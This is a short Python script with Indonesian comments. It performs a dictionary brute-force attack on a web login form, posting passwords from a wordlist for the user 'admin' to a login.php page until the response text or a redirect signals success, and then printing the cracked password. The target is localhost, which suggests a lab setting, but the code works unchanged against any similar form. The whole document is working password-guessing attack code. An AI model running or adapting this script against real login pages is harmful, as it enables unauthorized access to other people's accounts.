import requests

url = "http://localhost/nama-aplikasi/login.php"
username = "admin"
# Tidak perlu user_cookies di sini

with open("passwords_list.txt", "r") as f:
    for line in f:
        password = line.strip()
        data = {'user': username, 'pass': password, 'submit': 'login'}
        
        # Kirim POST tanpa cookies
        response = requests.post(url, data=data)
        
        # Jika berhasil login, biasanya server melakukan redirect atau 
        # menampilkan kata kunci tertentu seperti "Selamat Datang"
        if "Berhasil" in response.text or response.status_code == 302:
            print(f" Berhasil! Password adalah: {password}")
            break
        else:
            print(f" Gagal: {password}")